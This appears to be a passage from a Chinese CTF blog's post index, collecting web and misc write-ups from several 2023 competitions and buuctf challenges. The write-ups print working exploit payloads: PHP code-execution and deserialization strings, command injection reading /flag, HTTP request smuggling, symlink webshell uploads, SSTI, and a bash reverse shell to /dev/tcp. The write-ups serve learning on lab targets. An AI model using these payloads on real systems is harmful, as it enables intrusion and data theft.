不同数字时会给我们pass内容 当b&#x3D;3 a为其他数字 可以爆出pass的内容 这里需要写一个脚本完成 pass&#x3D;password是富强民主文明和谐自由平等公正法制爱国敬业诚信友善 妈的 太抽象了 payload：shell.php?pass=password是富强民主文明和谐自由平等公正法制爱国敬业诚信友善&amp;cmd=cat /h* PPP这是一道python的原型链污染 之前没见过 但是跟nodejs的原型链污染大同小异 python原型链具体分析之后会补上 现在实在没时间 直接狂看 这篇文章 md源码是从这里偷的八 给了附件源码 如下： 可以发现有 &#x2F;和&#x2F;eavl 看到了老熟人 merge() python原型链污染的重要代码就是这部分 达到的效果和nodejs中的差不多 在&#x2F;eval路由中 我们将get获取到的值传给evilFunc(cmd) 但前提是 这个shell参数为为true 也是就为1也就是 if not shell这个判断语句为假 可以看到这个函数被创建时已经默认复制给shell = False 也就是0的效果 如果我们可以原型链污染 将默认值设置为shell = 1 那么就可以命令执行了 __kwdefaults__ 是 Python 中函数对象的一个特殊属性，用于获取函数的关键字参数的默认值。 evilFunc()属于全局函数要用__globals__ payload如下 或者是 然后在&#x2F;下打入 再到&#x2F;eval路由下反弹shell即可 这里反弹shell的时候当时用了bash试了好多次没有成功 因为是复现 估计是靶场问题 但是用python反弹就可以成功 payload如下 pyweb放过自己"},{"title":"2023年 第三届陕西省大学生网络安全技能大赛（本科高校组）","date":"2023-06-06T16:01:00.000Z","url":"/post/96d146ad.html","tags":["pop链"],"categories":["各赛事WP"],"content":"2023年 第三届陕西省大学生网络安全技能大赛（本科高校组） web misc复现 前言这次反应出我的缺点： 不够细心，ezpop进去后没有源码 以为是上neepu一样的源码泄露，没成功，然后扫了后台，一顿瞎操作，看了WP才发现是js中有一段base64，妈的，我真是纯出生，不够认真已经是老毛病了。 找到答案了没有能够仔细照payload进行 那个反序列化修改私有属性考反射的题目 我tm已经payload写的和答案几乎一样了，细节可能有问题，但是当时做题不知道为啥还是显示被waf 然后就放弃了 。。 妈的 这道题目真可惜 3.老是想象着把题目想的很复杂很难，可能一些题目需要很扎实的基本功吧。 WEBezrce这道题目一眼丁真 和buu那个套娃一样 主要考的就是无参RCE，比较友好。 代码如上 偷的 复现没环境 很难受 自己写一下 preg_replace() /e模式可以代码执行 我的payload：name=hahaha&amp;qaq=print_r(eval(array_pop(apache_request_headers()))) 然后next 之类的移动指针都被waf了 用array_popbypass 也就是把数组中最后一个元素值弹出 我们bp抓包修改一下 其实还有其他移动指针的函数：each()prev()以及current()但是都是指向当前由请求头组成数组的第一个元素 也就是host 这个改了网页就没法正常访问了 所以只能通过array_pop()把最后一个修改了 记得当时是X-Real-Ip 看了大佬的WP 还有一种是参考 通过session_id()来做的 paylaod:name=hahaha&amp;qaq=show_source(session_id(session_start())); 然后抓包 Cookie: session_id=/flag即可 ezpop这个题进去没源码 以为是当时那个PHP &lt;&#x3D; 7.4.21远程源码泄露漏洞  试了 无果 最后看他js中藏了一段base64 我眼瞎 但是tm谷歌浏览器他在源码中没显示出来 我操了 这不是我的锅啊 我日了 源码如下： 链子如下： 需要注意的点就是这里会过滤&#x2F;flag 的第一个/直接用伪协议读就可以了 其次就是throw new Exception(&#39;seino&#39;);阻止我们的链子 其实考点就是fast destrcut 随便破坏链子的结构可以了 之前见过 payload: 然后这里还有坑 发现传上去之后没用 用不了 然后这里复制代码到vscode才发现玄机 传参这里有unicode不可见字符 [U+2066]类似于这样的是控制文本显示方向的 没必要细究 然后传参肯定是这一坨 需要url编码一下 pyaload:%E2%80%AE%E2%81%A6%E5%BF%AB%E7%BB%99%E6%88%91%E4%BC%A0%E5%8F%82%E2%81%A9%E2%81%A6pop=O:5:&quot;night&quot;:1:&#123;s:5:&quot;night&quot;;O:3:&quot;day&quot;:1:&#123;s:3:&quot;day&quot;;O:4:&quot;dark&quot;:1:&#123;s:4:&quot;dark&quot;;O:5:&quot;light&quot;:1:&#123;s:5:&quot;light&quot;;O:3:&quot;day&quot;:1:&#123;s:3:&quot;day&quot;;O:4:&quot;dark&quot;:1:&#123;s:4:&quot;dark&quot;;s:49:&quot;php://filter/convert.base64-encode/resource=/flag&quot;;&#125;&#125;&#125;&#125;&#125; test进去是一个登录框 可以注册 然后登录 然后就会显示 hello 登录名看到这里谁不会想到是ssti呢 但是这是一个幌子 然后在登陆页面看源码可以发现 /profile/index 啥也没有 当然如果真没用 他也不会特意设置 唉 我真是猪脑 然后可以访问/profile/adminMD5解密 获得 admin的密码 asdfgh123 进去之后 看了大佬的wp 提示帮我们运行go文件 然后手写一个上传框 亮sensei给的 上传上去之后抓包将 name改为file 这里问后端java舍友说是因为后端可能存在一个名为file的变量来接受他 所以这里要改为file tql 终于明白了 因此 &lt;input type=&quot;file&quot; name=&quot;uploadfilename&quot; id=&quot;file&quot;&gt;&lt;br&gt;中的name值不是固定的 要根据情况而定 然后上传go的反弹shell文件(偷的) 如下 就可以了 真的tql unserialize这道题目很可惜 应该是出了的 通过反射来修改类的的私有属性 源码如下; 看了大佬的WP 有个很简单的非预期 非预期直接通过%0a 换行符进行bypass payload：a=system%0a(&#39;cat /flag&#39;); 以后做题 %00 空字符 %20 空格符 %0a 换行符这种非预期要多尝试 预期草！！！！！！！！！！！！ 这个题目 回过头再看我的payload是对的 只不过把sectet拼成secret不是 sectet是什么啊 我真服了 我一直当作secret在做题 md 我真无语了 sectet到底是出题人拼错了 还是有含义啊 我真服了 利用PHP反射来给私有属性赋值以及调用私有函数 参考这篇文章：分析的很细  分析： Esc4pe_T0_Mong0没源码 暂定 Misc管道一道关于图片隐写的题目 直接 zsteg -a 1.png|grep &quot;flag&quot; 可是雪啊飘进双眼首先是一段音频和一个文本 然后拖进Audacity查看波形图 一段摩斯电码 上网查一下学习一下 得到.-- --- .- .. ... .... .- -. -..- .. 得到密文WOAISHANXI 但是还是没法解开加密的压缩包 然后还有一个文本 从名字上能看出是snow加密 在下载一个脚本 输入刚才得到的密码 然后解密即可 得到 获得flag压缩包的密码 然后我这里binwalk抽风了 很奇怪 之前用的好好的 玛德 找到原因了 原来要用root运行在之后加上 --run-as=root就可以了"},{"title":"NSSCTFRound#13 Web","date":"2023-06-05T15:27:59.000Z","url":"/post/a2e74ccf.html","tags":["flask session伪造","沙箱逃逸"],"categories":["各赛事WP"],"content":"NSSCTFRound#13 Web flask?jwt?一道简单的session伪造题目 登录框 找回密码处抓包可以看到key th3f1askisfunny 然后session伪造即可 这里稍微注意一下就是&#123;&#39;_fresh&#39;: True, &#39;_id&#39;: &#39;265688f22c7df9002e7945b00aed58a7d242ad62b885769d87fd147973f6e663d4e0cdece191e918da66579e1ae54cd9c622333f1832675ef4d8e3f28a66286e&#39;, &#39;_user_id&#39;: &#39;2&#39;&#125; 以往我们都是将name改为admin即可 这道题目将2改为1即可 改为0的话就是没登录状态 ez_factorsfactors是linux自带的一个因式分解命令 发现题目显示的结果与我们在linux执行factor一样 那么猜测这里存在命令执行 发现我们执行命令是可以的 读一下&#x2F;etc&#x2F;passwd 也是有回显的 说明我们命令是执行成功的 但是输出结果过滤掉了除冒号和数字以外的符号 这里注意一下要将我们路径中的斜杠需要url编码一下 防止与url中的反斜杠产生歧义 所以我只要使其输出全部为数字 就能bypass了 这里用到了od命令 payload:114514;od%20-t%20d1%20%2Fflag od -t d1的命令解释： 输出了每个字节按十进制输出 注意前面的是序号 78 83 83 67 84 70 123 101 99 52 52 49 102 52 98 45 52 50 48 101 45 52 48 53 55 45 56 51 53 97 45 51 97 50 50 53 102 98 99 56 102 53 57 125 10 将每个十进制转为十六进制然后转为字符串即可 十六进制：4E 53 53 43 54 46 7B 65 63 34 34 31 66 34 62 2D 34 32 30 65 2D 34 30 35 37 2D 38 33 35 61 2D 33 61 32 32 35 66 62 63 38 66 35 39 7D 0A 信息收集这个题目做的很懵逼 访问index.php 有个文件包含 payload的是：GET /nssctf/1%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0aGET%20/flag.txt HTTP/1.1 最终在请求包中达到的效果为： 看大佬WP是Apache HTTP Server 请求走私漏洞 CVE-2023-25690 参考： 还有CRLF注入 参考 问了一下GPT 感觉说的很到位 比如我们可以bp抓包一下 就可以看到请求体内容结尾都是\\r\\n结尾的 在HTTP当中HTTP的Header和Body之间就是用两个crlf进行分隔的，如果能控制HTTP消息头中的字符，就能注入一些恶意的换行 比如chatGPT在其中恶意添加crlf(\\r\\n) 再加入一个恶意制造的请求体 导致解析出问题 回到题目 读 /usr/local/apache2/conf/httpd.conf 看大佬wp是 做了个proxy转发 这也就是为什么payload访问的是localhost 从内部网上的服务器去读flag.txt MyWeb源码如下： 类似于一个沙箱逃逸吧 构造特殊的方式来bypass mode&#x3D;save 读入 mode&#x3D;read 读出 主要是： $data = str_replace(&#39;]&#39;, &quot;, &#39;$value&#39;]&quot;, $data);利用这个逃逸 我们不输入任何内容直接读一下 发现只有一个元素1 这里就类似于构造sql注入一样 构造让[]去闭合再加上注释加换行%0a 相互换来换去 总有一种方式可以 原来形式猜测是[1] 替换后[1,$value] 则我们构造];//%0a&lt;shell&gt;;//%0a[ flask?jwt?(hard)这道就是第一道的加强版 key没有给我们 所以只能去找 发现提示 有个路由/wor 发现它可以获取我们上次的登陆时间 当时这里就没有思路了 看了WP 访问/wor让其报错 然后能看到源码中的key key：hardgam3_C0u1d_u_f1ndM3???? 这样获取key的方式还是第一次见 涨知识了 接着就是老套路 session伪造获取flag即可 这里session伪造的时候把后面关于时间的数据去掉，或者加上引号，不然会报错 TimeTrcer放过自己"},{"title":"CISCN-16 国赛初赛后的复现以及一些感悟","date":"2023-05-31T15:35:21.000Z","url":"/post/5cb82439.html","tags":["RCE奇淫方式","软链接"],"categories":["各赛事WP"],"content":"CISCN-16 感悟以及想法不出意外，国赛初赛还是一道题都没有做出来，有太多知识我还没有去掌握，有太多题目我还没有去做，赛前总是满腔热血总想大干一番，但是总是一道题目都做不出来，抑郁一下午。 每次比赛结束看了wp总是说哪个哪个题目真简单，太可惜了，但是，事实真是如此吗。 什么是难题？ 我认为这个问题具有相对性，相对于人，也相对于时空。 相对于人：一道题目，如果对于知识储备量多的人而言，见多识广，则在审题中则会发现端倪，甚至是一眼丁真，而对于一个知识储备量并不是很充足的人来说，可能拿到题目并不能找到他的考点，甚至是四处乱撞，而我，在这次比赛中就是如此，一道题目不知道他的考点就会根据我能捕捉到到的或者是题目泄露出来仅有的信息去逐个逐个检索，可能运气好会检索出来，但是失败总是来得更加频繁。 相对于时空：我会成长，做题亦如此。一道现在做不出来的题目，之后去认真学习以及回顾，那么当之后再遇到此类型的题目时候就不至于一头雾水。 那么难题，就我自己的看法，在比赛中做不出来的题目则就是难题，当然这是存在前提，一些人为导致的前提，比如由于出题人的不严谨可能一道很简单的考点硬是要通过去猜的方式才能做出来，或者夹杂着出题人自身色彩的题目，题目终归是要回归于大众，那么受众群体应该是做题的人，如果通过先去了解出题人再去了解题目，这就有点本末倒置了（这里主要是指WEB方向，与社工相异）。 所以纯是看了WP而认为是简单题的，可能只是题目复杂度比较小，陌生程度比较低，但是总归 比赛中做不出来的题目那就是对于自身的难题。 再来谈谈PY 这次国赛PY程度堪称让我瞠目结舌，即便在我身边也存在。 当然，我也存在。 我总是在一些比赛中，做题做着做着，突然就没了思路，然后就想问问其他人一些思路，总是想着也许我获取一点帮助就能做出来呢（因为我这个人总是比较爱钻牛角尖，有时候会在一些没意义的地方停留很久），其实我认为这种只是获取一点思路的帮助，虽然不对，但是不会很恶劣，他具有一定的积极性质，可能通过寻求一点思路就把这道题目做出来，那么正向反馈是很客观的。相比于更为受人唾弃的则是，一点不了解题目甚至是没有仔细审题，直接去PY做法的，我觉得这种行为做法并没有一点实际意义，本来CTF就是以赛促学，最终目的是掌握这个知识，而不是排名，当然随着商业化模式的侵蚀与在当今社会下浮躁的心态，静下心来学习是一件难能可贵的事情。 举个简单的例子比如Flask的SSTI，payload有很多，一开始我认为直接用一个脚本去注入，不是很方便很简单嘛，但是如果题目稍稍变动，那么脚本的局限性质就会体现出来，毕竟脚本是人为提前编译好的，题目稍稍改动加修改就会让脚本无法用。当然，对于已经掌握了这个知识的大佬，通过脚本实现一些对他而言无意义的机械重复式的操作，也是没毛病的，毕竟大佬会，只是一个做与不做的问题。而对我，并没有熟练的掌握，却透过脚本干一些本末倒置的事情是毫无意义的。 最后，我认为web是一个需要沉淀的方向，他需要大量的基础功底以及语言功底，我只是一个普通人无法做到短时间就能拿到我自己认为有价值的排名也好，奖项也好，只能说任重而道远。 以上只是我单方面的赛后想法以及总结，只是用来鞭策与提醒我自己不忘初心，希望未来能更好。 WEBUNZIP考点：软链接 这是一道2021深育杯的原题  首先是一个上传文件 之后给了源码： 分析源码 我们上传上去的压缩包会被修改为tmp_name 并且路径是&#x2F;tmp我们也是访问不到的 我们能访问到的只能是默认web环境下 也就是&#x2F;var&#x2F;www&#x2F;html 再根据题目描述是unzip所导致的问题 看了wp 是根据软链接这里可以理解为是win的快捷方式 先来看unzip -o这是这道题的前提 我们能够通过解压覆盖原有的文件 我们可以先创建一个软链接文件test 指向&#x2F;var&#x2F;www&#x2F;html 然后打包test.zip上传上去 ln -s /var/www/html test 这里的符号链接其实就是软链接 再写一个一句话木马 放到test文件中 打包test2.zip上传上去 因为是test文件下有个test.php（我们的木马） 所以要递归处理 当test.zip被解压后 会有一个指向&#x2F;var&#x2F;www&#x2F;html 的软链接文件test 然后接着test2.zip被解压后 同名软链接文件test 会被覆盖然后 但是test目录软链接指向&#x2F;var&#x2F;www&#x2F;html 解压的时候会把test文件中的test.php放在&#x2F;var&#x2F;www&#x2F;html，此时我们达到了getsehll的目的，这里思路一定要捋清。 然后访问/test.php即可 dumpit一道mysqldump rce的题目 跟sql注入没一点关系 题目中也提示了 rce 我像个铸币一样一直在试闭合方式去构造奇怪的注入点 我脑子有问题是吧 非预期其实这道题目对我来说rce点我找不到 这是一个见多识广的结果 根据大佬的wp dump出日志其实是通过命令执行实现的 ，我们看的那个日志功能大概率不是日志，而是mysqldump这个工具用来备份数据库的，所以这里应该直接执行的程序命令，所以能换行符RCE 通过换行符%0a绕一下 然后直接rce 如果直接读flag是不行的 估计预期解要涉及提权问题 但是出题人这里没有把环境变量删了 导致直接读环境变量就出了 还有另一种是 这里过滤了$可以通过getallheaders()截取请求头方式bypass 这种做法其实我最想问这个&#x2F;app&#x2F;log路径是怎么来的 我当时做通过报错只能获取的路径只有/log BackendService考点：一道结合身份认证绕过和Nacos结合Spring Cloud Gateway RCE利用的题目 首先是Nacos身份认证绕过漏洞 参考 这道题目复现环境是在ctfshow下 当时国赛身份认证绕过参考的是 这里稍稍不同 请求包如下： 之后来到后台 接着就是跟着复现 动态配置路由达到RCE 添加一个配置 这里添加时Data ID 要根据题目给的附件 去查看java源码 配置内容参考前面文章中的 但是格式要转为json源码中也提到了 注意这里原文章给的payload格式是yaml 根据源码需要json格式 找个在线网站转一下格式即可 这里我一开始这个payload 格式 看来看去难道要手动转json格式吗 亏贼，而且这个格式好眼熟，之后好好想了一下原来是省赛的时候呢到yaml反序列化 学过这个格式 我就说格式好眼熟啊 反弹shell 即可 但是有时候弹不成功 环境问题 go_session源码如下： 看了源码发现要进行session伪造，当时做题的时候以为类似于falsk的session伪造 去网上找脚本 但是都没运行成功 并且也不知道key 就寄了 复现的时候看了大佬的WP key是空值 麻了 这里就需要本地来搭建一下 此前零接触go 所以搭建很费力 请了亮sensei帮我弄 搭建好本地环境之后 修改这两个地方 本地启动抓包 将session 复制到题目上去直接就可以了（这里注意要删除原来的session 然后刷新一下） 然后就有两个接口/admin``/flask 国赛环境下当时/flask?name=/就会报错 报错界面暴露可以算pin码，也就是debug开启的，但是这道题目没法通过算pin码来做出来 看亮师傅wp是因为这道题目可以文件热部署（也就是不用通过重新编译来达到更新目的 后台直接修改更新即可） 再来看/admin tpl, err := pongo2.FromString(&quot;Hello &quot; + xssWaf + &quot;!&quot;)直接来看这里 就是模板注入pongo2的模板注入 tpl.execute把c也放进去了的，这个c代表着gin里的上下文对象，可以引用Context下的所有函数了 gin.Context 里面包装了 Request 和 ResponseWriter, 这里大佬的WP用的 Request.UserAgent() payload: &#123;&#123;c.SaveUploadedFile(c.FormFile(c.Request.UserAgent()),c.Request.UserAgent())&#125;&#125; 偷的大佬的数据包 直接覆盖源码 server.py /flask?name=/shell?cmd=ls$&#123;IFS&#125;/ 这里过滤了空格 命令执行就行了 tql 这里其实还有很多知识 这里不太懂说起来很难受 以后再强点 再来补坑吧 Web就到这里 其他题目对于我来说还在未知领域等我去探索。 MISC签到根据提示print(open(&#39;flag&#39;).read())就出了 被加密的生产流量题目描述： 某安全部门发现某涉密工厂生产人员偷偷通过生产网络传输数据给不明人员，通过技术手段截获出一段通讯流量，但是其中的关键信息被进行了加密，请你根据流量包的内容，找出被加密的信息。 应该直接去过滤通讯流量 找到MODBUS协议 追踪流一下 组合起来发现base32编码 因为末尾有等号并且只有大写和数字的编码 pyshell一道python jail 过滤了很多字符 并且限制了输入字符不能超过7位 其实就是构造shell的奇淫姿势 payload： 这里用到的&#39;_&#39;是一种特殊标识符， 在交互式解释器中被用来存放最近一次求值结果 。参考： 结尾：最近期末了，可能会忙期末的事情，先把六级过了md，这次一定要过了，已经是第二次了，上次就差十来分，可恶啊，不想被这个拖着了，还有期末冲了，什么数电，信号，电路给👴死，等着奥，头套给你薅一地 必须打你脸奥，当然比赛不会停，秉着菜还爱打的良好作风，冲了，只是WP会欠一些，比如BUU还欠着一些，亏贼，干了！"},{"title":"NEEPU Sec 2023 公开赛 WEB部分题复现","date":"2023-05-23T15:36:51.000Z","url":"/post/c9fcd25b.html","tags":["ssti","PHP反序列化","flask框架"],"categories":["各赛事WP"],"content":"NEEPU Sec 2023 公开赛 WEB部分题复现 我就是个纯废物 Cute Cirno人最麻的一集 本来应该很快出结果的 还是自己太菜了 存在一个任意文件读取的漏洞 通过报错信息 去读app文件 或者访问/proc/self/cmdline去获取当前正在运行的进程 获得源码： 其实一眼扫过去就是session伪造 然后套了一层ssti 但是当时做这道题的时候看了他的key生成过程 就觉得key根本伪造不了 非预期：然后既然之前都报错了 说明debug是开启的 源码中也表明了 呢就直接去计算pin码 网上脚本很多 主要有高版本和低版本的 这里要根据题目去选择相应的脚本版本 这道题目是高版本的 脚本如下：参考  当时做题没算出pin码 不知道是哪里出的问题 甚至把所有id都试了一次 之后复现的时候 才发现被脚本中的提示稍稍误导了一下 或者是自己纯菜 脚本中提到/etc/machine-id(docker不用看) 难道赛题环境不是docker吗 我裂开 但是这道题目需要合并/etc/machine-id /proc/self/cgroup才能计算出正确的pin码 当时做题的时候一直用/proc/sys/kernel/random/boot_id /proc/self/cgroup去算 一直是错的 不过这里也不是说脚本中提到的是错的 而是做题的时候最好都试一遍 qwq 应该是先去读/etc/machine-id，如果读不到,那么就是/proc/sys/kernel/random/boot_id和/proc/self/cgroup拼接了 计算出来之后 命令执行即可 预期解赛后了解了一下 发现预期解太难了 是根据2022年蓝帽杯初赛改编的 然后这里key的确是伪造不出来 但是任何信息都是存在内存里 可以通过去读内存读出来 借用p神的语句 这里直接贴上Boogipop 亮sensei的脚本 看得出来也是从p神稍加修改 而我连脚本都看不懂 尼玛就菜的离谱 暑假一定要去系统学一下python 好好锻炼锻炼自己写脚本的能力 脚本大致过程就是 先去读取&#x2F;proc&#x2F;self&#x2F;maps的信息 然后通过map里栈的地址 再去去正则匹配里面的信息 就是去匹配这样的信息7f50caee6000-7f50cb9e6000 rw-p 00000000 00:00 0 然后再根据读出来的地址mem内存 然后再去通过地址范围正则匹配我们需要的key 就行了 真的tql session伪造成功后 就是一个过滤了 很多字符的ssti 根据亮sensei的payload session 伪造的时候 通过把shell放进session 然后我们payload去截取就可以了 真的tql payload：&#123;%print(((lipsum[(session|string)[35:46]])[(session|string)[53:55]])[(session|string)[73:78]]((session|string)[85:139]))%&#125; 然后这里需要注意 截的时候并不是我们直接看到的&#123;&#39;admin&#39;:1,&#39;__globals__&#39;:1,&#39;os&#39;:1,&#39;read&#39;:1,&#39;popen&#39;:1,&#39;bash-c\\&#39;bash-i&gt;&amp;/dev/tcp/ip/port&lt;&amp;1\\&#39;&#39;:1&#125;索引 通过&#123;%print(session|string)%&#125;可以打印出来 前面还有点其他信息 这是一个小细节 通过反弹shell 就ok了 真的太强了 发现还是得去老老实实去刷一遍ctfshow的ssti 去弄明白不同的paylaod ezphp当时做这道题 一看界面是空白的 各种尝试之后还是啥都没有 就放弃了 看了wp 返现是php&lt;&#x3D;7.4.21远程源码泄露的漏洞  其实关键是怎么发现php版本???? 并且检索到相关漏洞 可能大佬一眼就丁真了 对我比较困难 然后抓包 构造一个如下的请求头 获得源码 是一个pop链 做不出来 是在太菜了 里面有我不会的知识点 没有属性值是怎么pop的 好离谱 乖乖去刷ctfshow 先放着吧 之后再回来填坑 我是垃圾 呜呜呜 太菜了 菜的想死"},{"title":"buuctf-84-[CISCN2019 总决赛 Day2 Web1]Easyweb","date":"2023-05-21T02:00:45.000Z","url":"/post/1e328461.html","tags":["sql注入","sql bypass"],"categories":["buuctf"],"content":"[CISCN2019 总决赛 Day2 Web1]Easyweb 一个登录界面 查看源码发现图片是通过/image.php?id=1获取的 猜测这里应该是有sql注入的 日常查看/robots.txt发现存在备份文件 查看image.php.bak 发现存在sql注入 需要构造特殊的语句来注入 addslashes($id) 先来看看addslashes()函数 它会在这些符号前添加反斜杠进行转义 官方文档也提及了 如果使用不得当 就会出现安全问题 再来看$id=str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$id); 看到$id存在一个替换操作 我们可以构造 $id=\\\\0&#x3D;&gt;经过addslashes()&#x3D;&gt;$id=\\\\\\\\0&#x3D;&gt;str_replace()&#x3D;&gt;$id=\\\\(相当于一个反斜杠) 则查询语句就会变为：select * from images where id=&#39;\\\\&#39; or path=&#39;&#123;$path&#125;&#39; id反斜杠转义了&#39;使得$id=&#39;\\\\&#39; or path=&#39;那么我们就可以在$path输入我们的注入语句 接下来就是一个常规的二分法盲注 脚本如下： 需要注意这道题目用于查询的where单双引号都被waf了 需要bypass 可以用16进制进行绕过 可以得到admin密码为：027e3da10ae66606cef2 之后是一个文件上传 简单上传一个一句话木马 发现后php缀名都被过滤了 随便上传一个文件 提示：I logged the file name you uploaded to logs/upload.4f264cd65c72b60d3bd54f98a8189048.log.php. LOL 他将我们的文件名上传到这个php文件 可以发现这个php文件记录了我们上传的文件名 既然这个记录文件自身就为php文件 可以执行php代码 那么我们就可以通过修改文件名为一句话木马 从而getshell 这里他屏蔽了 php 用短标签bypass就行 不知道为什么有时候上传上去的文件名🐎他不显示 但是可以运行 很奇怪可能是环境问题 "},{"title":"buuctf-67-[WUSTCTF2020]颜值成绩查询","date":"2023-05-19T07:37:16.000Z","url":"/post/4f323e41.html","tags":["sql注入","sql bypass"],"categories":["buuctf"],"content":"[WUSTCTF2020]颜值成绩查询 一道经典的用if条件判断的二分法盲注题目 过滤了空格 用()嵌套或者&#x2F;**&#x2F;绕过就行了 其他还好 复习一下二分法 当然也可以用异或来注入 payload： "},{"title":"LitCTF 2023 （公开赛道）WEB方向WP","date":"2023-05-14T14:04:03.000Z","url":"/post/d4be732.html","tags":["js","flask session伪造","sql注入","vim"],"categories":["各赛事WP"],"content":"LitCTF 2023（公开赛道）WEB方向WP 整体web都很简单，这次也是第一次ak所有web题目，总排名50&#x2F;1148，被实验室其他方向的👴带飞，keep on！ Web我Flag呢？（彩蛋一）查看源码爆flag F12 彩蛋，但是当时是通过翻源码翻出来的，麻了 导弹迷踪查看game.js源码 Follow me and hack me（彩蛋三）后来复现的时候才发现这道题把提交按钮ban了 当时做的时候直接用hackbar提交的 也是偷了一个一血:) payload: ?CTF=Lit2023 然后post一个challenge=i&#39;m_c0m1ng 提示有备份文件 /www.zip下载一个源码 里面有彩蛋三 PHP是世界上最好的语言！！写个php代码就行了 Vim yydsvim 并且题目提示漏了 就想到是vim不正常退出导致的swp文件泄露 当时记得是在ctfshow刷题刷到的 .index.php.swp 下载一个文件 然后这里看了大佬的wp 才知道 vim -r可以恢复源码 tql post一个cmd命令执行 并且password要等与base64加密后的password 传参即可 作业管理系统(彩蛋二)查看源码显示用户名密码都是admin 然后上传一个一句话木马 /木马访问就行了 然后在这里能看到一个github链接 点进去就是第二个彩蛋 _S0_ne3t? (2/?) 这是什么？SQL ！注一下 ！（彩蛋四）这个题目真给自己无语住了 一开始用1，2都有正常回显 其他都没有回显 以为是盲注 注了半天还注出来了 发现里面没有flag表和字段 就感觉自己做错了 回头看看 发现是简单的联合注入 真无语住了 根据题目是sql语句闭合是)))))) payload: 爆数据库： 爆表： 爆字段： 爆数据： 1)))))) union select 1,flag from ctftraining.flag# 最后一个稍微有点坑 是我不了解的知识点 之前联合注入都是比如 select flag from flag 没有限定数据库 导致当时做这道题目时候一直没注出来 麻了人 这里要限定一下数据库然后再加上表名 ctftraining.flag 又学到了 然后输入2 就是第四个彩蛋了 Http pro max plusUser-Agent: Chrome 这里要把其他的删光只留这个 当时问了一下出题人 Via: Clash.win这是我学到的新知识 Via头部列出从客户端到 OCS 或者相反方向的响应经过了哪些代理服务器 之后获得一个新路由 查看源码/sejishikong.php 获得flag Ping发现除了127.0.0.1以外其他都会被拦截 并且是前端拦截 直接js禁用 1zjs这道题 我愿称之为我是终极眼瞎 去翻了好多次源码 眼瞎没看到 甚至想过原型链污染 最后一次去看源码 一眼丁真 就藏在最开始的地方 我真该死 访问 /f@k3f1ag.php获得一串jsfuck码 在console中打入就能得到flag 彩蛋从上面题目各获取一部分 拼起来即可NSSCTF&#123;First_t0_The_k3y!_S0_ne3t?_R3ady_Pl4yer_000ne_F1rst_to_Th3_eggggggggg!&#125; 就当无事发生感觉这道题目不是一个web题目 纯纯的社工题目 找到github博客仓库 然后去看博客仓库分支的commit提交 Flag点击就送！这题吧 不想说啥 一眼丁真就以为session伪造 但是没有给到具体的key的信息或者暗示 然后想过模板注入也都不是 甚至想到xss去获取admin session 最后发现 key 就是 LitCTF 。。 最后session伪造 访问/flag即可"},{"title":"buuctf-76-[CISCN2019 华北赛区 Day1 Web1]Dropbox","date":"2023-05-11T15:04:57.000Z","url":"/post/fb6927e0.html","tags":["代码审计","phar"],"categories":["buuctf"],"content":"[CISCN2019 华北赛区 Day1 Web1]Dropbox 一道经典的phar 反序列化题目 注册一个账号然后登录 发现可以上传文件 一开始以为是上传木马 当然不可能 buu第三页的题目不可能这么简单 然后下载我们上传上去的文件 发现通过&#x2F;download 请求了filename=来实现下载 这里存在文件任意读漏洞 构造paylaod:filename=../../文件可以得到很多源码 共能下到7个php文件 接下来就是漫长的代码审计了 审计：首先 login.php与register.php都是很常规的初处理 不多说 然后是uplaod.php也是一些常规的检查上传文件合法与否的语句 download.php与delete.php一起看吧 不管是删除还是下载路由都有$file = new File(); 跟踪一下 到class.php 也是最重要的 File类中发现了file_get_contents()如果能调用 则可以文件包含 可以构造User-&gt;db(__destruct)-&gt;File-&gt;close()来触发 但是读到的文件不能输出 发现还有一个类FileList 中有一个魔术方法 其实一般有魔术方法的类 都会去找能不能构造pop链条 既然之前构造的链条没法回显 那么我们就要通过构造别的链条来使得回显 User-&gt;db(__destruct)-&gt;Filelist-&gt;__call-&gt;File-&gt;close()再通过File函数的析构函数来回显 当对象调用一个不存在的方法时，就会调用__call方法 并且默认$func为不存在函数名 $args为参数 并且以数组形式 用一个简单的demo来看看 整个魔术方法__call达到的效果就是将文件包含的结果传递给$this-&gt;results二维数组 好让析构函数输出 那么这里__call方法是怎么做到的呢 一开始一直不明白这里的原理 看了好多wp 都没有提及 纯属是我太菜了 $file其实就是我们要去构造的File对象 $func是返回的close函数名 上面的demo中也提到了 所以这里就等价为File-&gt;close是这样调用的 其析构函数可以将返回的结果返回 稍微审计一下其实就是把result数组结果赋值给$table 然后echo $table;输出 明白了整个链子 应该怎么构造呢 题目只容许我们上传一个文件 不像我们平常做的pop链 去赋值给一个变量让其反序列化 Typo3 反序列化漏洞该漏洞由phar:&#x2F;&#x2F;触发 可以直接去看大佬的总结：   说说我自己的看法 首先我们的phar文件能够上传到对方服务器上 并且有相应的魔术方法作为踏板 而且/ phar:// 不能被转义 phar是php的压缩文件并且不经过解压就能直接被php访问并且执行 phar结构由四部分组成： stub phar 文件标识，格式为 xxx&lt;?php xxx; __HALT_COMPILER();?&gt;； manifest 压缩文件的属性等信息，以序列化存储； contents 压缩文件的内容； signature 签名，放在文件末尾； 构造固定内容为： 我们将构造的恶意pop链塞入$phar-&gt;setMetadata();中 ,并且存储形式为序列化字符串形式存储 通过winhex查看一下 当我们通过phar://去访问该文件时 我们构造的恶意序列化pop链就会被反序列化 从而执行恶意代码 明白了原理之后 直接构造 然后这个flag路径是怎么推测出来的 其实题目也有暗喻 在download.php 不过如果我做这道题目肯定会当个瞎子 将我们生成的Z1d10t.phar改为Z1d10t.png上传上去这个后缀名并不会因为被修改而影响 猜测就像那个yaml反序列化题目一样 是通过二进制文件读取的 所以后缀无所谓 然后这里访问也有个坑 我们可以通过download.php 下载访问 或者 delete.php 删除访问 如果我们通过下载页面访问是不行的 download.php中有这么一串代码 PHP ini_set用来设置php.ini的值，在函数执行的时候生效，脚本结束后，设置失效。无需打开php.ini文件，就能修改配置，对于虚拟空间来说，很方便。参考： 绕过 open_basedir可以参考： 也就是说download.php访问文件只被限定于:/etc:/tmp``getcwd()也就是当前文件 三个路径 没法去读我们的文件 而delete.php没有被限定 可以去读 "},{"title":"ctfshow-nodejs","date":"2023-05-10T02:46:41.000Z","url":"/post/372ab69b.html","tags":["nodejs原型链污染","nodejs"],"categories":["ctfshow"],"content":"nodejs刷题 前言因为打一次比赛做到了这个nodejs原型链污染，是一点头绪都没有，就来恶补一下，keep on！ 